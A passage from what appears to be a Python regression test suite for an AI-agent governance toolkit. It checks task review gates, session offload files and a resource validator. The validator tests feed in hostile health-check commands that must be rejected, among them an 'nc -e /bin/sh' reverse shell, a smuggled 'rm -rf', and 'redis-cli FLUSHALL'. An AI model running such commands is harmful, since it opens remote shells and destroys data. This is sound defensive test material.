        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "guard-task",
            "--title",
            "Guard task",
            "--profile",
            "standard",
        ],
        cwd=guarded,
    )
    bad_stage = run([python, "scripts/agent_task.py", "update", "guard-task", "--stage", "made_up_stage"], cwd=guarded, expect_ok=False)
    if "invalid stage" not in (bad_stage.stdout + bad_stage.stderr):
        print("agent_task.py did not reject an invalid current_stage", file=sys.stderr)
        print(bad_stage.stdout + bad_stage.stderr, file=sys.stderr)
        raise SystemExit(1)
    run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "guard-task",
            "--requirements-status",
            "complete",
            "--shared-understanding",
            "Guard task scope is understood.",
            "--domain-glossary-updated",
            "--code-docs-cross-checked",
        ],
        cwd=guarded,
    )
    done_without_conclusion = run([python, "scripts/agent_task.py", "update", "guard-task", "--state", "done"], cwd=guarded, expect_ok=False)
    if "conclusion" not in (done_without_conclusion.stdout + done_without_conclusion.stderr):
        print("agent_task.py did not reject done without delivery_conclusion", file=sys.stderr)
        print(done_without_conclusion.stdout + done_without_conclusion.stderr, file=sys.stderr)
        raise SystemExit(1)
    done_without_review = run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "guard-task",
            "--state",
            "done",
            "--conclusion",
            "Implemented and validated.",
            *goal_args,
            *decomposition_args,
        ],
        cwd=guarded,
        expect_ok=False,
    )
    if "review_gate" not in (done_without_review.stdout + done_without_review.stderr):
        print("agent_task.py did not reject done without a passing review gate", file=sys.stderr)
        print(done_without_review.stdout + done_without_review.stderr, file=sys.stderr)
        raise SystemExit(1)
    for stage in ("spec", "plan", "implementation", "spec_review", "quality_review", "verification", "handoff"):
        run(
            [
                python,
                "scripts/agent_task.py",
                "update",
                "guard-task",
                "--stage-review-stage",
                stage,
                "--stage-review-status",
                "pass",
                "--stage-review-path",
                "docs/features/guard-task/05_CODE_REVIEW.md",
                "--clear-stage-open-findings",
            ],
            cwd=guarded,
        )
    run(
        [
            python,
            "scripts/agent_task.py",
            "update",
            "guard-task",
            "--state",
            "done",
            "--conclusion",
            "Implemented and validated.",
            "--review-status",
            "pass",
            "--review-path",
            "docs/features/guard-task/05_CODE_REVIEW.md",
            "--clear-open-findings",
            "--requirements-status",
            "complete",
            "--shared-understanding",
            "Guard task scope is understood.",
            "--domain-glossary-updated",
            "--code-docs-cross-checked",
            *goal_args,
            *decomposition_args,
        ],
        cwd=guarded,
    )
    run([python, "scripts/agent_task.py", "doctor"], cwd=guarded)

    board_path = guarded / ".agent" / "task-board.json"
    board = json.loads(board_path.read_text(encoding="utf-8"))
    board["items"][0]["current_stage"] = "made_up_stage"
    board_path.write_text(json.dumps(board, indent=2) + "\n", encoding="utf-8")
    invalid_stage_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=guarded, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=guarded, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=guarded, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=guarded, expect_ok=False),
    ]
    invalid_stage_text = "\n".join(item.stdout + item.stderr for item in invalid_stage_outputs)
    if "current_stage" not in invalid_stage_text:
        print("manual invalid current_stage was not reported by hard checks", file=sys.stderr)
        print(invalid_stage_text, file=sys.stderr)
        raise SystemExit(1)

    guarded_done = temp_root / "task-board-done-guard"
    guarded_done.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(guarded_done),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "done-task",
            "--title",
            "Done task",
            "--profile",
            "standard",
        ],
        cwd=guarded_done,
    )
    done_board_path = guarded_done / ".agent" / "task-board.json"
    done_board = json.loads(done_board_path.read_text(encoding="utf-8"))
    done_board["items"][0]["state"] = "done"
    done_board["items"][0]["delivery_conclusion"] = ""
    done_board["items"][0]["requirements"] = {
        "required": True,
        "status": "complete",
        "shared_understanding": "Done guard task scope is understood.",
        "domain_glossary_updated": True,
        "code_docs_cross_checked": True,
        "open_questions": [],
    }
    done_board_path.write_text(json.dumps(done_board, indent=2) + "\n", encoding="utf-8")
    done_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=guarded_done, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=guarded_done, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=guarded_done, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=guarded_done, expect_ok=False),
    ]
    done_text = "\n".join(item.stdout + item.stderr for item in done_outputs)
    if "delivery_conclusion" not in done_text:
        print("done task without delivery_conclusion was not reported by hard checks", file=sys.stderr)
        print(done_text, file=sys.stderr)
        raise SystemExit(1)

    review_guard = temp_root / "task-board-review-gate-guard"
    review_guard.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(init_script),
            str(review_guard),
            "--layout",
            "minimal",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    run(
        [
            python,
            "scripts/agent_task.py",
            "new",
            "review-task",
            "--title",
            "Review task",
            "--profile",
            "standard",
        ],
        cwd=review_guard,
    )
    review_board_path = review_guard / ".agent" / "task-board.json"
    review_board = json.loads(review_board_path.read_text(encoding="utf-8"))
    review_board["items"][0]["state"] = "done"
    review_board["items"][0]["delivery_conclusion"] = "Implemented and validated."
    review_board["items"][0]["requirements"] = {
        "required": True,
        "status": "complete",
        "shared_understanding": "Review guard task scope is understood.",
        "domain_glossary_updated": True,
        "code_docs_cross_checked": True,
        "open_questions": [],
    }
    review_board["items"][0]["review_gate"]["status"] = "needs-fix"
    review_board["items"][0]["review_gate"]["latest_review"] = "docs/features/review-task/05_CODE_REVIEW.md"
    review_board["items"][0]["review_gate"]["open_findings"] = ["major: missing regression coverage"]
    review_board_path.write_text(json.dumps(review_board, indent=2) + "\n", encoding="utf-8")
    review_gate_outputs = [
        run([python, "scripts/agent_task.py", "doctor"], cwd=review_guard, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=review_guard, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=review_guard, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=review_guard, expect_ok=False),
    ]
    review_gate_text = "\n".join(item.stdout + item.stderr for item in review_gate_outputs)
    if "review_gate" not in review_gate_text:
        print("done task with a failing review gate was not reported by hard checks", file=sys.stderr)
        print(review_gate_text, file=sys.stderr)
        raise SystemExit(1)

    for profile in ("tiny", "bugfix"):
        profile_guard = temp_root / f"task-board-{profile}-review-guard"
        profile_guard.mkdir(parents=True, exist_ok=True)
        run(
            [
                python,
                str(init_script),
                str(profile_guard),
                "--layout",
                "minimal",
                "--governance-profile",
                "standard",
            ],
            cwd=PACKAGE_ROOT,
        )
        task_id = f"{profile}-review-task"
        run(
            [
                python,
                "scripts/agent_task.py",
                "new",
                task_id,
                "--title",
                f"{profile} review task",
                "--profile",
                profile,
            ],
            cwd=profile_guard,
        )
        command = [
            python,
            "scripts/agent_task.py",
            "update",
            task_id,
            "--state",
            "done",
            "--conclusion",
            "Implemented and validated.",
            "--decomposition-status",
            "complete",
            "--decomposition-summary",
            f"Complete the {profile} review-gate regression fixture.",
            "--decomposition-next-task",
            "Verify missing review gate rejection.",
            "--decomposition-evidence-path",
            f"docs/features/{task_id}/04_DEVELOPMENT.md",
            "--decomposition-subtask",
            "Attempt done without review gate",
        ]
        if profile == "bugfix":
            command.extend(
                [
                    "--requirements-status",
                    "complete",
                    "--shared-understanding",
                    "Bugfix review-gate fixture scope is understood.",
                    "--domain-glossary-updated",
                    "--code-docs-cross-checked",
                    "--goal-raw",
                    "User asked to guard bugfix review completion.",
                    "--goal-refined",
                    "Verify bugfix tasks cannot complete without a passing review gate.",
                    "--goal-refinement-rationale",
                    "Regression fixture narrows the request to one completion-gate behavior.",
                    "--goal-confirmation-status",
                    "agent_assumed",
                    "--goal-objective",
                    "Verify bugfix review gate.",
                    "--goal-outcome",
                    "Bugfix task completion is blocked without review.",
                    "--goal-decision-summary",
                    "Use a deterministic bugfix fixture to verify universal review gates.",
                    "--goal-spec-change",
                    "regression-fixture",
                    "--goal-non-goal",
                    "Do not test standard stage-review behavior here.",
                    "--goal-constraint",
                    "Keep the fixture deterministic.",
                    "--goal-success-evidence",
                    "agent_task.py rejects done without review_gate.",
                    "--goal-stop-condition",
                    "Stop if bugfix done can bypass review_gate.",
                ]
            )
        profile_result = run(command, cwd=profile_guard, expect_ok=False)
        if "review_gate" not in (profile_result.stdout + profile_result.stderr):
            print(f"{profile} done task without review gate was not rejected by review_gate", file=sys.stderr)
            print(profile_result.stdout + profile_result.stderr, file=sys.stderr)
            raise SystemExit(1)


def assert_resource_catalog_guards(target: Path, python: str) -> None:
    run([python, "scripts/agent_resources.py", "doctor"], cwd=target)
    match = json.loads(
        run(
            [
                python,
                "scripts/agent_resources.py",
                "match",
                "--intent",
                "production repair database",
                "--include-disabled",
                "--json",
            ],
            cwd=target,
        ).stdout
    )
    candidate_ids = {item.get("id") for item in match.get("candidates", [])}
    excluded_ids = {item.get("id") for item in match.get("excluded", [])}
    if "staging-database-template" in candidate_ids or "staging-database-template" not in excluded_ids:
        print("resource match used do_not_use_for as positive matching evidence", file=sys.stderr)
        print(json.dumps(match, indent=2), file=sys.stderr)
        raise SystemExit(1)

    resources_path = target / ".agent" / "resources.json"
    original = resources_path.read_text(encoding="utf-8")
    resources = json.loads(original)

    def assert_bad_healthcheck(case_id: str, command: object, expected_text: str) -> None:
        case_resources = json.loads(original)
        case_resources["resources"][0]["health_checks"] = [
            {
                "id": case_id,
                "command": command,
                "risk": "low",
            }
        ]
        resources_path.write_text(json.dumps(case_resources, indent=2) + "\n", encoding="utf-8")
        result = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
        if expected_text not in (result.stdout + result.stderr):
            print(f"resource doctor did not reject unsafe healthcheck case: {case_id}", file=sys.stderr)
            print(result.stdout + result.stderr, file=sys.stderr)
            raise SystemExit(1)

    resources["resources"][0]["endpoint"]["url"] = "postgres://user:pass@example/db"
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    secret_url = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
    if "secret-looking inline value" not in (secret_url.stdout + secret_url.stderr):
        print("resource doctor did not reject a database URL with embedded credentials", file=sys.stderr)
        print(secret_url.stdout + secret_url.stderr, file=sys.stderr)
        raise SystemExit(1)

    assert_bad_healthcheck(
        "dangerous-shell",
        "echo ok; rm -rf /tmp/agent-gov-regression-sentinel",
        "shell metacharacters",
    )
    assert_bad_healthcheck(
        "inline-python",
        ["python3", "-c", "open('/tmp/agent-gov-regression-bypass', 'w').write('x')"],
        "not allowed in health checks",
    )
    assert_bad_healthcheck("long-sleep", ["sleep", "9999"], "not allowlisted")
    assert_bad_healthcheck("git-clone", ["git", "clone", "https://example.com/repo.git"], "read-only argument policy")
    assert_bad_healthcheck("curl-post", ["curl", "-X", "POST", "https://example.com/health"], "read-only argument policy")
    assert_bad_healthcheck("curl-post-head-override", ["curl", "-X", "POST", "-I", "https://example.com/health"], "read-only argument policy")
    assert_bad_healthcheck("nc-exec", ["nc", "-e", "/bin/sh", "example.com", "1234"], "read-only argument policy")
    assert_bad_healthcheck("redis-flushall", ["redis-cli", "FLUSHALL"], "read-only argument policy")
    assert_bad_healthcheck("psql-sql", ["psql", "-c", "select 1"], "not allowed in health checks")

    resources = json.loads(original)
    resources["resources"][0]["description"] = "$PASSWORD=abc123"
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    dollar_secret = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
    if "secret-looking inline value" not in (dollar_secret.stdout + dollar_secret.stderr):
        print("resource doctor did not reject a dollar-prefixed inline secret assignment", file=sys.stderr)
        print(dollar_secret.stdout + dollar_secret.stderr, file=sys.stderr)
        raise SystemExit(1)

    resources = json.loads(original)
    gated_resource = json.loads(json.dumps(resources["resources"][0]))
    gated_resource.update(
        {
            "id": "approval-gated-regression",
            "environment": "release",
            "risk": "high",
            "description": "Regression fixture for approval-gated resource healthchecks.",
            "when_to_use": ["Exercise healthcheck approval gating."],
            "do_not_use_for": ["Production operations."],
            "health_checks": [
                {
                    "id": "approved-gate",
                    "command": ["test", "-e", ".agent/resources.json"],
                    "risk": "low",
                }
            ],
        }
    )
    resources["resources"].append(gated_resource)
    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
    gated_check = run([python, "scripts/agent_resources.py", "healthcheck", "approval-gated-regression"], cwd=target, expect_ok=False)
    if "requires approval" not in (gated_check.stdout + gated_check.stderr):
        print("resource healthcheck did not require approval for high-risk resource execution", file=sys.stderr)
        print(gated_check.stdout + gated_check.stderr, file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_resources.py", "healthcheck", "approval-gated-regression", "--dry-run"], cwd=target)

    resources_path.write_text(original, encoding="utf-8")
    run([python, "scripts/agent_resources.py", "doctor"], cwd=target)


def assert_session_offload_protocol(target: Path, python: str) -> None:
    run(
        [
            python,
            ".agent/tools/agent_session.py",
            "start",
            "offload-smoke",
            "--goal",
            "Offload smoke",
        ],
        cwd=target,
    )
    index = json.loads((target / ".agent" / "sessions" / "index.json").read_text(encoding="utf-8"))
    session_id = index.get("active_session")
    if not session_id:
        print("session offload smoke did not create an active session", file=sys.stderr)
        raise SystemExit(1)
    session_dir = target / ".agent" / "sessions" / session_id
    for relative in ("grounding.md", "offload.jsonl", "offload-index.md", "task-map.mmd", "refs/.gitkeep", "refs/git-status-short.txt"):
        if not (session_dir / relative).exists():
            print(f"session offload artifact missing: {relative}", file=sys.stderr)
            raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "grounding", "--checked", "scripts/agent_check.py"], cwd=target)
    add = json.loads(
        run(
            [
                python,
                ".agent/tools/agent_session.py",
                "offload-add",
                "--summary",
                "Validated offload smoke",
                "--evidence",
                "scripts/agent_check.py",
                "--kind",
                "validation",
            ],
            cwd=target,
        ).stdout
    )
    if add.get("schema") != "agent-session-offload-v1" or add.get("authority") != "advisory":
        print("offload-add did not create an advisory offload entry", file=sys.stderr)
        raise SystemExit(1)
    recall = json.loads(
        run([python, ".agent/tools/agent_session.py", "offload-recall", "smoke", "--json"], cwd=target).stdout
    )
    if not recall.get("matches"):
        print("offload-recall did not return the smoke entry", file=sys.stderr)
        raise SystemExit(1)
    task_map = run([python, ".agent/tools/agent_session.py", "offload-map"], cwd=target).stdout
    if "flowchart TD" not in task_map or "Validated offload smoke" not in task_map:
        print("offload-map did not include the expected task canvas", file=sys.stderr)
        print(task_map, file=sys.stderr)
        raise SystemExit(1)
    rollover = run(
        [
            python,
            ".agent/tools/agent_session.py",
            "rollover",
            "--summary",
            "Prepare rollover",
            "--next",
            "Continue validation",
        ],
        cwd=target,
    ).stdout
    if "Truth-First Grounding" not in rollover or "Offload Index" not in rollover:
        print("rollover did not include grounding/offload sections", file=sys.stderr)
        print(rollover, file=sys.stderr)
        raise SystemExit(1)
    run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target)
    run([python, "scripts/agent_check.py"], cwd=target)
    run([python, "scripts/agent_verify.py", "doctor"], cwd=target)
    score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target).stdout)
    if score.get("dimensions", {}).get("session_offload", {}).get("status") != "pass":
        print("session_offload score did not pass for a valid offload session", file=sys.stderr)
        print(json.dumps(score, indent=2), file=sys.stderr)
        raise SystemExit(1)

    original = (session_dir / "offload.jsonl").read_text(encoding="utf-8")
    (session_dir / "offload.jsonl").write_text(original + "{bad json\n", encoding="utf-8")
    invalid_outputs = [
        run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False),
    ]
    invalid_text = "\n".join(item.stdout + item.stderr for item in invalid_outputs)
    if "offload" not in invalid_text.lower():
        print("invalid offload JSONL was not reported", file=sys.stderr)
        print(invalid_text, file=sys.stderr)
        raise SystemExit(1)

    bad_entry = dict(add)
    bad_entry["id"] = "offload-bad-evidence"
    bad_entry["evidence"] = ["missing-evidence.md"]
    (session_dir / "offload.jsonl").write_text(json.dumps(bad_entry) + "\n", encoding="utf-8")
    dangling_outputs = [
        run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False),
    ]
    dangling_text = "\n".join(item.stdout + item.stderr for item in dangling_outputs)
    if "missing-evidence.md" not in dangling_text:
        print("dangling offload evidence was not reported", file=sys.stderr)
        print(dangling_text, file=sys.stderr)
        raise SystemExit(1)

    bad_entry["evidence"] = ["scripts/agent_check.py"]
    bad_entry["authority"] = "authoritative"
    (session_dir / "offload.jsonl").write_text(json.dumps(bad_entry) + "\n", encoding="utf-8")
    authority_outputs = [
        run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False),
        run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False),
    ]
    authority_text = "\n".join(item.stdout + item.stderr for item in authority_outputs)
    if "advisory" not in authority_text:
        print("memory-as-truth offload authority was not reported", file=sys.stderr)
        print(authority_text, file=sys.stderr)
        raise SystemExit(1)

    (session_dir / "offload.jsonl").write_text(original, encoding="utf-8")
    run([python, ".agent/tools/agent_session.py", "doctor"], cwd=target)
    run([python, "scripts/agent_verify.py", "doctor"], cwd=target)


def main() -> int:
    python = sys.executable
    temp_root = Path(tempfile.mkdtemp(prefix="agent-gov-regression-"))
    try:
        assert_install_skill_scope(temp_root)
        assert_doctor_requires_target_skill(temp_root)
        assert_blank_project_default_profile(temp_root)
        assert_session_doctor_handles_long_git_status(temp_root, python)
        if sys.platform.startswith("win"):
            target = temp_root / "agent-gov"
        else:
            target = temp_root / r"C:\Users\airpot\AppData\Local\Temp\agent-gov"
        target.mkdir(parents=True, exist_ok=True)

        run(
            [
                python,
                str(INIT_SCRIPT),
                str(target),
                "--tech-stack",
                "python",
                "--layout",
                "minimal",
                "--remote-kind",
                "local",
                "--governance-profile",
                "full",
            ],
            cwd=PACKAGE_ROOT,
        )

        assert_native_hook_json_contract(target, python)

        config_path = target / ".agent" / "config.json"
        config = json.loads(config_path.read_text(encoding="utf-8"))
        if config.get("schema") != "agent-project-config-v1":
            print(".agent/config.json has the wrong schema", file=sys.stderr)
            return 1
        if "\\" in str(target) and config.get("remote_workspace_path") != str(target.resolve()):
            print(".agent/config.json did not preserve the workspace path", file=sys.stderr)
            return 1
        expected_schemas = {
            ".agent/manifest.json": "agent-governance-manifest-v1",
            ".agent/risk-zones.json": "agent-risk-zones-v1",
            ".agent/review-policy.json": "agent-review-policy-v1",
            ".agent/workflow-profiles.json": "agent-workflow-profiles-v1",
            ".agent/task-board.json": "agent-task-board-v1",
            ".agent/role-contracts.json": "agent-role-contracts-v1",
            ".agent/mechanical-checks.json": "agent-mechanical-checks-v1",
            ".agent/baselines.json": "agent-baselines-v1",
            ".agent/dev-map.json": "agent-dev-map-v1",
            ".agent/skill-hygiene.json": "agent-skill-hygiene-v1",
            ".agent/harness-evolution.json": "agent-harness-evolution-v1",
            ".agent/mcp-policy.json": "agent-mcp-policy-v1",
            ".agent/governance-gc.json": "agent-governance-gc-v1",
        }
        for relative, schema in expected_schemas.items():
            path = target / relative
            data = json.loads(path.read_text(encoding="utf-8"))
            if data.get("schema") != schema:
                print(f"{relative} has the wrong schema", file=sys.stderr)
                return 1
        project_skills = json.loads((target / ".agent" / "project-skills.json").read_text(encoding="utf-8"))
        project_skill_policy = project_skills.get("policy", {})
        if project_skill_policy.get("default_install_scope") != "project" or project_skill_policy.get("global_install_requires_explicit_request") is not True or project_skill_policy.get("fail_on_unmanaged_global_skills") is not True:
            print("project skill governance policy did not default to project install scope and global governance", file=sys.stderr)
            print(json.dumps(project_skill_policy, indent=2), file=sys.stderr)
            return 1
        distribution = json.loads((target / ".agent" / "skill-distribution.json").read_text(encoding="utf-8"))
        if distribution.get("default_install_scope") != "project" or distribution.get("project_codex_skill_dir") != ".codex/skills" or distribution.get("policy", {}).get("global_install_requires_explicit_request") is not True:
            print("skill distribution policy did not default to project-local installation", file=sys.stderr)
            print(json.dumps(distribution, indent=2), file=sys.stderr)
            return 1
        manifest = json.loads((target / ".agent" / "manifest.json").read_text(encoding="utf-8"))
        harness = json.loads((target / ".agent" / "harness.json").read_text(encoding="utf-8"))
        if sorted(manifest.get("required_paths", [])) != sorted(harness.get("invariants", {}).get("required_paths", [])):
            print(".agent/manifest.json required_paths does not match .agent/harness.json", file=sys.stderr)
            return 1
        for relative in (
            ".agent/templates/grounding.md.tmpl",
            ".agent/templates/offload.jsonl.tmpl",
            ".agent/templates/offload-index.md.tmpl",
            ".agent/templates/task-map.mmd.tmpl",
            ".agent/templates/refs/.gitkeep",
        ):
            if not (target / relative).exists():
                print(f"{relative} was not created", file=sys.stderr)
                return 1
        if not (target / "docs" / "AI_CODING_GLOSSARY.md").exists():
            print("docs/AI_CODING_GLOSSARY.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "DOMAIN_GLOSSARY.md").exists():
            print("docs/DOMAIN_GLOSSARY.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "features" / "INDEX.md").exists():
            print("docs/features/INDEX.md was not created", file=sys.stderr)
            return 1
        if not (target / "docs" / "DEV_MAP.md").exists():
            print("docs/DEV_MAP.md was not created", file=sys.stderr)
            return 1

        assert_no_missing_doc_refs(target)
        assert_workflow_stage_closure(target)
        assert_resource_catalog_guards(target, python)
        assert_spec_archive_gate(target, python)
        run([python, "scripts/agent_check.py"], cwd=target)
        run([python, "scripts/agent_migrate.py", "doctor"], cwd=target)
        assert_session_offload_protocol(target, python)
        run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=target)
        run([python, "scripts/agent_skill_hygiene.py", "doctor"], cwd=target)
        hygiene_report = json.loads(run([python, "scripts/agent_skill_hygiene.py", "report", "--json"], cwd=target).stdout)
        if hygiene_report.get("schema") != "agent-skill-hygiene-report-v1":
            print("agent_skill_hygiene.py did not produce the expected report schema", file=sys.stderr)
            return 1
        gc_report = json.loads(run([python, "scripts/agent_gc.py", "report", "--json"], cwd=target).stdout)
        if gc_report.get("schema") != "agent-governance-gc-report-v1" or gc_report.get("status") != "pass":
            print("agent_gc.py did not produce a clean governance report", file=sys.stderr)
            print(json.dumps(gc_report, indent=2), file=sys.stderr)
            return 1
        run([python, "scripts/agent_task.py", "doctor"], cwd=target)
        run(
            [
                python,
                "scripts/agent_task.py",
                "new",
                "regression-task",
                "--title",
                "Regression task",
                "--profile",
                "standard",
                "--risk",
                "medium",
            ],
            cwd=target,
        )
        run([python, "scripts/agent_task.py", "doctor"], cwd=target)
        if not (target / "docs" / "features" / "regression-task" / "01_REQUIREMENT_ANALYSIS.md").exists():
            print("feature stage documents were not created", file=sys.stderr)
            return 1
        requirement_gate = run([python, "scripts/agent_task.py", "update", "regression-task", "--stage", "plan"], cwd=target, expect_ok=False)
        if "requirements" not in (requirement_gate.stdout + requirement_gate.stderr):
            print("agent_task.py did not enforce the requirements interview gate", file=sys.stderr)
            print(requirement_gate.stdout + requirement_gate.stderr, file=sys.stderr)
            return 1
        run(
            [
                python,
                "scripts/agent_task.py",
                "update",
                "regression-task",
                "--requirements-status",
                "complete",
                "--shared-understanding",
                "Regression task scope is understood.",
                "--domain-glossary-updated",
                "--code-docs-cross-checked",
                "--decomposition-status",
                "complete",
                "--decomposition-summary",
                "Create the regression task, satisfy requirements, and enter plan with explicit next steps.",
                "--decomposition-next-task",
                "Move the task to plan after spec-stage review evidence is recorded.",
                "--decomposition-evidence-path",
                "docs/features/regression-task/04_DEVELOPMENT.md",
                "--decomposition-subtask",
                "Create regression task",
                "--decomposition-subtask",
                "Validate plan gate behavior",
                "--goal-raw",
                "User asked to exercise the regression task plan gate.",
                "--goal-refined",
                "Verify a standard regression task can enter plan only after requirements, goal contract, decomposition, and spec review evidence are present.",
                "--goal-refinement-rationale",
                "The fixture converts the broad regression task into a specific protected-stage gate check.",
                "--goal-confirmation-status",
                "agent_assumed",
                "--goal-objective",
                "Verify protected-stage gates for a standard task.",
                "--goal-outcome",
                "The task enters plan only after required evidence is complete.",
                "--goal-decision-summary",
                "Use a local regression task to exercise requirements, goal, decomposition, and stage-review gates.",
                "--goal-spec-change",
                "regression-fixture",
                "--goal-non-goal",
                "Do not test release publishing in this fixture.",
                "--goal-constraint",
                "Keep the fixture deterministic.",
                "--goal-success-evidence",
                "agent_task.py accepts the plan transition after required evidence is present.",
                "--goal-stop-condition",
                "Stop if plan can be entered without required evidence.",
            ],
            cwd=target,
        )
        spec_review_path = target / "docs" / "features" / "regression-task" / "spec-review.md"
        spec_review_path.write_text("# Spec Stage Review\n\n- Status: pass\n- Findings: none\n", encoding="utf-8")
        run(
            [
                python,
                "scripts/agent_task.py",
                "update",
                "regression-task",
                "--stage-review-stage",
                "spec",
                "--stage-review-status",
                "pass",
                "--stage-review-path",
                spec_review_path.relative_to(target).as_posix(),
                "--clear-stage-open-findings",
            ],
            cwd=target,
        )
        run([python, "scripts/agent_task.py", "update", "regression-task", "--stage", "plan"], cwd=target)
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target)
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "before-regression", "--fail-on-issue"], cwd=target)
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "after-regression", "--fail-on-issue"], cwd=target)
        run(
            [
                python,
                "scripts/agent_verify.py",
                "compare",
                "--before",
                ".agent/baselines/before-regression.json",
                "--after",
                ".agent/baselines/after-regression.json",
            ],
            cwd=target,
        )
        tests_dir = target / "tests"
        tests_dir.mkdir(exist_ok=True)
        test_file = tests_dir / "test_agent_gov_regression.py"
        test_file.write_text("def test_agent_gov_regression():\n    assert True\n", encoding="utf-8")
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "before-test-count", "--fail-on-issue"], cwd=target)
        test_file.unlink()
        run([python, "scripts/agent_verify.py", "snapshot", "--name", "after-test-count", "--fail-on-issue"], cwd=target)
        test_count_compare = run(
            [
                python,
                "scripts/agent_verify.py",
                "compare",
                "--before",
                ".agent/baselines/before-test-count.json",
                "--after",
                ".agent/baselines/after-test-count.json",
            ],
            cwd=target,
            expect_ok=False,
        )
        if "test_files" not in (test_count_compare.stdout + test_count_compare.stderr):
            print("agent_verify.py did not report a test-count baseline decrease", file=sys.stderr)
            print(test_count_compare.stdout + test_count_compare.stderr, file=sys.stderr)
            return 1
        test_file.write_text("def test_agent_gov_regression():\n    assert True\n", encoding="utf-8")
        artifacts_template = target / ".agent" / "templates" / "artifacts.json.tmpl"
        original_artifacts_template = artifacts_template.read_text(encoding="utf-8")
        artifacts_template.write_text('{"schema": "{{schema}}",\n', encoding="utf-8")
        template_check = run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False)
        if "template_rendering" not in (template_check.stdout + template_check.stderr):
            print("agent_verify.py did not report invalid rendered JSON templates", file=sys.stderr)
            print(template_check.stdout + template_check.stderr, file=sys.stderr)
            return 1
        artifacts_template.write_text(original_artifacts_template, encoding="utf-8")
        classify = json.loads(
            run(
                [
                    python,
                    "scripts/agent_gc.py",
                    "classify",
                    "--category",
                    "script_gap",
                    "--summary",
                    "Regression classification",
                    "--promotion-target",
                    "scripts/agent_verify.py",
                ],
                cwd=target,
            ).stdout
        )
        if classify.get("category") != "script_gap":
            print("agent_gc.py classify did not return the recorded category", file=sys.stderr)
            return 1
        evolution = json.loads((target / ".agent" / "harness-evolution.json").read_text(encoding="utf-8"))
        if not evolution.get("incidents"):
            print("agent_gc.py classify did not append a harness-evolution incident", file=sys.stderr)
            return 1
        run([python, "scripts/agent_score.py", "doctor"], cwd=target)
        score_report = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=target).stdout)
        for dimension in ("dev_map", "skill_hygiene", "harness_evolution", "mcp_policy", "governance_gc", "session_offload"):
            if dimension not in score_report.get("dimensions", {}):
                print(f"agent_score.py did not include {dimension}", file=sys.stderr)
                return 1
        run([python, "scripts/agent_score.py", "score", "--write"], cwd=target)

        review_policy_path = target / ".agent" / "review-policy.json"
        review_policy = json.loads(review_policy_path.read_text(encoding="utf-8"))
        review_policy["human_review"]["evidence_fields"].remove("high_risk_paths_checked")
        review_policy_path.write_text(json.dumps(review_policy, indent=2) + "\n", encoding="utf-8")
        missing_review_field_check = run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False)
        missing_review_field_score = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target)
        combined_review_output = (
            missing_review_field_check.stdout
            + missing_review_field_check.stderr
            + missing_review_field_score.stdout
            + missing_review_field_score.stderr
        )
        if "high_risk_paths_checked" not in combined_review_output:
            print("missing human review field was not reported", file=sys.stderr)
            print(combined_review_output, file=sys.stderr)
            return 1
        review_policy["human_review"]["evidence_fields"].append("high_risk_paths_checked")
        review_policy_path.write_text(json.dumps(review_policy, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_check.py"], cwd=target)

